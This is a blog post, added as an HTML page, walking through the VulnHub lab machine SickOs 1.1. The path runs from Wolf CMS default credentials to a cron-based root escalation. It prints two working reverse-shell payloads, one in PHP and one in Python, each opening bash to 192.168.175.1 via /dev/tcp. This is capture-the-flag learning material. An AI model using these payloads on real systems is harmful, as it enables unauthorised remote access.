@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Sickos 11 Walkthrough – mmmds's blog</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+  </head>
+
+
+  <body>
+	<div class="container">
+        <header>
+		<div>mmmds's blog</div>	
+         	<nav>
+            	<a href="/">posts</a>
+				|
+            	<a href="/projects/">projects</a>
+				|
+            	<a href="/about/">about</a>
+        	</nav>
+        </header>
+      </div>
+    </div>
+    <div id="main" role="main" class="container">
+      <article class="post">
+ 	<h1>Sickos 11 Walkthrough</h1>
+	<div><span class="post_list_date">2017-03-08</span></div>
+ 	<div class="entry">
+   	<p><a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a> is a vulnerable machine with an objective to get root and read file /root/a0216ea4d51874464078c618298b1367.txt</p>
+
+<p>To get VM’s IP I used nmap</p>
+
+<p><img src="/images/sickos1.png" alt="" /></p>
+
+<p>Output gave me information that VM runs http proxy. I configured Firefox to use it and tried to access VM’s localhost.</p>
+
+<p><img src="/images/sickos2.png" alt="" /></p>
+
+<p>I succeeded and noticed a simple website. I tried robots.txt and found out that there is Wolf CMS run under /wolfcms</p>
+
+<p><img src="/images/sickos3.png" alt="" /></p>
+
+<p>I asked google for some information about Wolf CMS and found two directories used for installation process - /install and /docs. I tried both but only /docs was available. In file http://localhost/wolfcms/docs/install.txt I found default credentials, but I didn’t know where to put them. I went to google again and searched for URL to admin panel which occurred to be http://localhost/wolfcms/?/admin/login.
+Default credentials worked and I got access to administration panel.</p>
+
+<p><img src="/images/sickos4.png" alt="" /></p>
+
+<p>From this place I was able to upload reverse shell and connect to VM.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.175.1/8888 0&gt;&amp;1'"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>After I got access to shell and started investigation what this machines does. I found that there is a cron running python script as root every minute. Fortunately I had permission to overwrite this file.</p>
+
+<p><img src="/images/sickos5.png" alt="" /></p>
+
+<p>I uploaded reverse shell again, but this time written in python.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.175.1/9999 0&gt;&amp;1'"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>I used existing shell to overwrite script with uploaded one, then I ran netcat on port 9999 and waited one minute until I got root shell.</p>
+
+<p><img src="/images/sickos6.png" alt="" /></p>
+
+<p><img src="/images/sickos7.png" alt="" /></p>
+
+ 	</div>
+</article>
+
+    </div>
+<footer><hr></footer>
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-89484033-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/SickOs-11-Walkthrough/',
+		  'title': 'Sickos 11 Walkthrough'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+</html>
